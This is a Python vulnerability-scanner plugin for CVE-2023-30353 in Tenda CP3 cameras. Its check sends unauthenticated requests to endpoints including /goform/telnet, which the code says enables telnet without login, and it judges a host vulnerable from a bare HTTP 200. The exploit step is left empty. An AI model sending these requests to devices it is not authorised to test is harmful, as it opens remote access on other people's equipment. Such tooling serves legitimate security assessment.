import requests

from loguru import logger

from .base import POCTemplate


class CVE_2023_30353(POCTemplate):
    """Tenda CP3 Unauthenticated RCE

    Tenda CP3 V11.10.00.2211041355 was discovered to contain a hard-coded
    default credential vulnerability. Unauthenticated attackers can access
    the telnet service and other management endpoints without authentication,
    leading to remote code execution. CVSS 9.8 Critical.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['tenda']
        self.product_version = ''
        self.ref = """
        https://nvd.nist.gov/vuln/detail/CVE-2023-30353
        https://github.com/advisories/GHSA-r6qr-3596-hwx7
        """
        self.level = POCTemplate.level.high
        self.desc = """Tenda CP3 unauthenticated RCE via telnet and goform endpoints.
        CVSS 9.8. Hard-coded credentials and unauthenticated access to
        management endpoints allow full device compromise."""

    def verify(self, ip, port=80):
        """Check for vulnerable Tenda CP3 endpoints"""
        headers = self._get_headers()
        proxies = self._get_proxies()

        # Check /goform/telnet endpoint (enables telnet without auth)
        url = self._get_url(ip, port, '/goform/telnet')
        try:
            r = requests.get(
                url,
                headers=headers,
                proxies=proxies,
                verify=False,
                timeout=self.config.timeout,
                allow_redirects=False
            )
            if r.status_code == 200:
                return ip, str(port), self.product, 'N/A', 'N/A', self.name
        except Exception as e:
            logger.error(e)

        # Check /goform/getSysteminfo (unauthenticated info disclosure)
        url = self._get_url(ip, port, '/goform/getSysteminfo')
        try:
            r = requests.get(
                url,
                headers=headers,
                proxies=proxies,
                verify=False,
                timeout=self.config.timeout,
                allow_redirects=False
            )
            if r.status_code == 200:
                return ip, str(port), self.product, 'N/A', 'N/A', self.name
        except Exception as e:
            logger.error(e)

        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(CVE_2023_30353)
